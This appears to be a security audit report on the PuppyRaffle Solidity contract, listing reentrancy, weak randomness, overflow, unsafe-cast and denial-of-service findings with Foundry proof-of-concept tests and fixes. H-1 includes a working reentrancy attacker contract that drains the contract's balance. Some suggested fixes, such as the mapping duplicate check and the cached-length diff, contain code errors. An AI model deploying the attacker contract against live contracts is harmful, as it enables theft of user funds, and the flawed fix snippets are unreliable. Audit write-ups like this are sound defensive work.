### [H-1] Reentrancy attack in `PuppyRaffe::refund` allows entra to drain raffle balance.

**Description:** The `PuppeRaffle::refund` function does follow the CEI (Checks, Effects, Interactions) and as a result, enables participents ot drain the contract balance. 

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after the making that external call do we up the `PuppyRaffle::players` array


```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);

@>       players[playerIndex] = address(0);
@>       emit RaffleRefunded(playerAddress);
    }
```

A player who has entered the raffle could have `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim anotherrefund. They could continue the cycle untill the contract balance is drained.

**Impact:** All fees payed by the raffle entrants could be stolen by the malicious participipant.

**Proof of Concept:**

1. User enters the raffle.
2. Attacker sets up a contract with a `fallback` function and calls `PuppyRaffle::refund`
3. Attacker Enters the Raffle
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the contract balance.

**Proof of Code**
<details>
<summary>Code</summary>

Place the following into `PuppyRaffleTest.t.sol`
```javascript
    function testReentrancyRefund() public{
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackContractBalance = address(attackerContract).balance;
        uint256 startingContractbalance = address(puppyRaffle).balance;

        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        console.log("Starting attacker contract balance: ", startingAttackContractBalance);
        console.log("Starting contract balance:", startingContractbalance);

        console.log("Ending attacker contract balance : ", address(attackerContract).balance);
        console.log("Ending contract balance :  " , address(puppyRaffle).balance);        
    }
```
</details>

And this contract as well.

<details>

```javascript
    contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle){
        puppyRaffle = _puppyRaffle;
        entranceFee= puppyRaffle.entranceFee();
    }

    function attack() external payable { 
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function stealMoney() internal {
        if(address(puppyRaffle).balance >= entranceFee){
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        stealMoney();
    }

    receive() external payable {
        stealMoney();
    }
}
```
</details>

**Recommended Mitigation:** 
To prevent this, we should have the `PuppyRafle::refund` function update the `players` array before making the external call. Additionally, we should move the  event emmision up as well.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);

        payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```


Denial of Service attack


### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows user to influence or predict winner and influence or predict the winning puppy.

**Description** Hashing `msg.sender`, `block.timestamp`, and `block.difficulty` together creates a predictable find number. A predicatble number is not a good random nubmer. Malicous users can manipulate these values or know them ahead of time to chose the winner of the raffle themselves.

*Note:* This additionaly means users coudl front-run this function and call `refund` if they see they are not the winner.

**Impact** Any user can influence teh winner of the raffle, winning the money and selecting the `rarest` puppy. Making the entire raffle worthless if it becoems a gas war as towho wins the raffles.

**Proof Of Concept:**

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and that to predict when/how to participate. See the [solidity blog on prevrandao] (https://soliditydeveloper.com/prevrandao). `block.diffuculty` was recently replaced with prevrandao.
2. Users can mine/manipulate their `msg.sender` value to result their address beingused to generate the winner!
3. User can revert their `selectWinner` transaction if they don't like the winer or resulting puppy.

Using on-chain values on randomness see is a [well-documented attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) blockchain space.


**Recommended Mitiations:** Consider using a cryptographically provable random number generator such as ChainLink VRF.

### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees

**Description:**  In solidity versions prior to `0.8.0` integers were subject to integer overflows.

```javascript
    uint64 myVar = type(uint64).max;
    //18446744073709551615
    myVar = myVar + 1;

//myVar will be 0
```

**Impact** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `PuppyRaffle::withdrawFees`. However, if the `totalFees` variable overflows, the `feeAddress`may not collect the correct amount of fees, leaving fees permanently stuck inthe contract.

**Proof of Concept:**

<details>

1. We have 100 players enter the raffle.
2. We conclude the raffle.
3. Since the total fees are more than what a `uint64` can old without overflowing. The expected fees are more than 10 times less thanthe expected fees.
4. You will not be able to withdraw,due to the link in `PuppyRaffle::withdrawFees()`
```javascript
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: Ther are currently Players active!");
```

Although you could use `selfDestruct` to send ETH to this contract in order for the values to match and withdraw the fees,this is clearly not the intended design of the protocol. At some point there will be too much `balance` in the contract that teh above `require` will be impossible to hit.

<summary>Code</summary>

```javascript
  function testTotalFeesCanOverFlow() external {
        //18_446_744_073_709_551_616  ~18.5 Eth
        //Total entries should be 100, so 100 eth will go to contract

        //Let's enter 100 players
        uint256 playersNum = 100;

        address[] memory newPlayers = new address[](playersNum);
        for(uint256 i = 0; i<playersNum; i++){
            newPlayers[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * newPlayers.length}(newPlayers);
        uint256 expectedTotalFees = ((newPlayers.length * puppyRaffle.entranceFee()) * 20) / 100;
        uint256 duration = puppyRaffle.raffleDuration();
        vm.warp(block.timestamp + duration);
        puppyRaffle.selectWinner();

        console.log(puppyRaffle.totalFees());
        console.log(expectedTotalFees);
        assertNotEq(puppyRaffle.totalFees(), expectedTotalFees);

    }
```
</details>

**Recommended Mitigiations:** There are a few possible mitigations.

1. Use a newer version of solidity, and a `uint256` instad of a `uint64` for `PuppyRaffle::totalFees`.
2. You could also use a `SafeMath` library of OpenZeppelin for version 0.7.6 of solidity, however you would still have a hard time of the `uint64` type if too many fees are collected.
3. Remove the balance check from `PuppyRaffle::withdrawFees`

```diff
- require(address(this).balance == uint256(totalFees), "PuppyRaffle: Ther are currently Players active!");
```

There are more attack vectors with that final require, so we recomend removing it regardless.

### [M-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` isa potential denial of service (DoS) attack, incrementing gas costs for future entrants.

**Description:** The `PuppyRaffle::enterRaffle` function loops through `players` array to check for duplicates. However the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas cost forplayers who enter right when the raffle stats will be dramatically lower han those who enter later. Every additional address in the `players` array, is an additional check the loop will have to make.

```javascript
//@audit DoS Attack
        for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

**Impact:** The gas costs for raffle entrants will greatly increase as more players enter the raffle. Discouraging later users from entering,and causing a rush at the start of the raffle to be one ofthe first entrants in the queue.

An attack might make the `PuppyRaffle::entrants` array so big, that no one else enters, guarenteeing themselves the win.

**Proof of Concept:**

If we have 2 sets of 100 players enter, the gas costs will be as such:
-1st 100 players: ~6252048 gas
-2nd 100 players: ~18068138 gas

This is more than 3x times more expensive for the second 100 players.

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffleTest.t.sol` 

```javascript
    function test_denialOfService() public {
        vm.txGasPrice(1);

        //Let's enter 100 players

        uint256 playersNum = 100;
        address[] memory newPlayers = new address[](playersNum);
        for(uint256 i = 0; i<playersNum; i++){
            newPlayers[i] = address(i);
        }

        //see how much gas it costs
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * newPlayers.length}(newPlayers);
        uint256 gasEnd = gasleft();

        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;

        console.log("Gas cost of the first 100 players" , gasUsedFirst);

        //Second 100 players
        address[] memory newPlayersTwo = new address[](playersNum);
        for(uint256 i = 0; i<playersNum; i++){
            newPlayersTwo[i] = address(i + playersNum);
        }

        //see how much gas it costs
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * newPlayersTwo.length}(newPlayersTwo);
        uint256 gasEndSecond = gasleft();

        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;

        console.log("Gas cost of the second 100 players" , gasUsedSecond);

        assert(gasUsedFirst < gasEndSecond);
    }
```
</details>

**Recommended Mitigation:** There are a few recommendations. 

1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check prevent the same person from entering multiple times, only the same wallet address.
2. Consdering using a mapping to check for duplicates. This would allow constant time lookup of wehter a user has already entered.

```diff
+ uint256 public raffleID;
+ mapping (address => uint256) public usersToRaffleId;
.
.
function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+           usersToRaffleId[newPlayers[i]] = true;
        }
        
        // Check for duplicates
+       for (uint256 i = 0; i < newPlayers.length; i++){
+           require(usersToRaffleId[i] != raffleID, "PuppyRaffle: Already a participant");

-        for (uint256 i = 0; i < players.length - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
        }

        emit RaffleEnter(newPlayers);
    }
.
.
.

function selectWinner() external {
        //Existing code
+    raffleID = raffleID + 1;        
    }
```

Alterntively, you could use [OpenZeppelin's`EnumerableSet` library]
(htps://docs.oppenzeppelin.com/contracts/4.x/api/utils#EnumerableSet)/

### [M-2] Unsafe cast of `PuppyRaffle::fee` loses fees

**Description:** In `PuppyRaffle::selectWinner` their is a type cast of a `uint256` to a `uint64`. This is an unsafe cast, and if the `uint256` is larger than `type(uint64).max`, the value will be truncated. 

```javascript
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length > 0, "PuppyRaffle: No players in raffle");

        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 fee = totalFees / 10;
        uint256 winnings = address(this).balance - fee;
@>      totalFees = totalFees + uint64(fee);
        players = new address[](0);
        emit RaffleWinner(winner, winnings);
    }
```

The max value of a `uint64` is `18446744073709551615`. In terms of ETH, this is only ~`18` ETH. Meaning, if more than 18ETH of fees are collected, the `fee` casting will truncate the value. 

**Impact:** This means the `feeAddress` will not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concept:** 

1. A raffle proceeds with a little more than 18 ETH worth of fees collected
2. The line that casts the `fee` as a `uint64` hits
3. `totalFees` is incorrectly updated with a lower amount

You can replicate this in foundry's chisel by running the following:

```javascript
uint256 max = type(uint64).max
uint256 fee = max + 1
uint64(fee)
// prints 0
```

**Recommended Mitigation:** Set `PuppyRaffle::totalFees` to a `uint256` instead of a `uint64`, and remove the casting. Their is a comment which says:

```javascript
// We do some storage packing to save gas
```
But the potential gas saved isn't worth it if we have to recast and this bug exists. 

```diff
-   uint64 public totalFees = 0;
+   uint256 public totalFees = 0;
.
.
.
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
-       totalFees = totalFees + uint64(fee);
+       totalFees = totalFees + fee;
```

# Low

### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existant players and for players at index 0, causing a player at index 0 to incorrectly think they hae not entered the raffle. 

**Description** If a player is the `PuppyRaffle::players` array at index 0, this return 0, butaccording to the natspec, it will also return 0 if the player is not in the array. 

```javascript
    function getActivePlayerIndex(address player) external view returns (uint256) {
        //@audit-info use a cached variable for players.length gas
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        //@audit player is at index 0, it'll return 0 and theyh might think they are not actie
        return 0;
    }
```


**Impact:** A player at index 0 may incorrectly thinkthey have not entered the raffle, and attempt toenterthe raffle again, wasting gas.

**Proof Of Concepts**

1. User enters raffle, they are the first entrant.
2. `PuppyRaffle::getActivePlayerIndex`  returns 0
3. User thinks they have not entered the raffle due to the documentation.

**Recommended Mitiations** The east recommendation would be to revert if the player is not in the array instead of returning 0.

You could reserve the 0th position for the competiion,but a better solution might be to return an `int256` where the function returns -1 if the player is not active. 

# Gas

### [G-1] Unchanged state varaibles should be declared constant or immutable.

Reading from storage is much more expensive than reading from a constant or immutable variable.

Instances:
-`PuppyRaffle::raffleDuration` should be `immutable`.
-`PuppyRaffle::commonImageUri` should be `constant`.
-`PuppyRaffle::rareImageUri` should be `constant`.
-`PuppyRaffle::legendaryImageUri` should be `constant`.


### [G-2] Storage variables in a loop should be cached.

Everytime you call `players.length` you read from storage, as opposed to memory which is more gas effecient.

```diff
+   uint256 playerLength = playersLength;
- for (uint256 i = 0; i < players.length - 1; i++) {
+  for (uint256 i = 0; i < playersLength - 1; i++) { 
-   for (uint256 j = i + 1; j < players.length; j++) {
+            for (uint256 j = i + 1; j < playersLength; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```


### [I-1]: Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

### [I-2]: Using an outdated version of solidity is not recommended. 

Please use a newer version like `0.8.18`.


**Recommendation**:
Deploy with any of the following Solidity versions:

0.8.18
The recommendations take into account:

-Risks related to recent releases
-Risks of complex code generation changes
-Risks of new language features
-Risks of known bugs
-Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

Please see [slither] (https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) documentation for more information.



### [I-3]: Missing checks for `address(0)` when assigning values to address state variables

Assigning values to address state variables without checking for `address(0)`.

- Found in src/PuppyRaffle.sol [Line: 68](src/PuppyRaffle.sol#L68)
- Found in src/PuppyRaffle.sol [Line: 216](src/PuppyRaffle.sol#L216)

### [I-4] `PuppyRaffle::selectWinner` should follow CEI

It's best to keep code clean and follow CEI (Checks, Effects, Interactions).

```diff
-       (bool, success,) = winner.call{value: prizePool}("");
-       require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner,tokenId);
+       (bool, success,) = winner.call{value: prizePool}("");  
+       require(success, "PuppyRaffle: Failed to send prize pool to winner");     

```


### [I-5] Use of "magic" numbers is discouraged.

It can be confusing to see number literals in a codebase, and it's much more readable if the numbers are givena  nma.e

Examples:

```javascript
    uint256 prizePool =(totalAmouuntCollected * 80 ) / 100;
    uint256 fee = (totalAmountCollected * 20 ) / 100;
```

Instead you could use:
```javascript
    uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
    uint256 public constant FEE_PERCENTAGE = 20;
    uint256 public constant POOL_PRECISION = 100;

```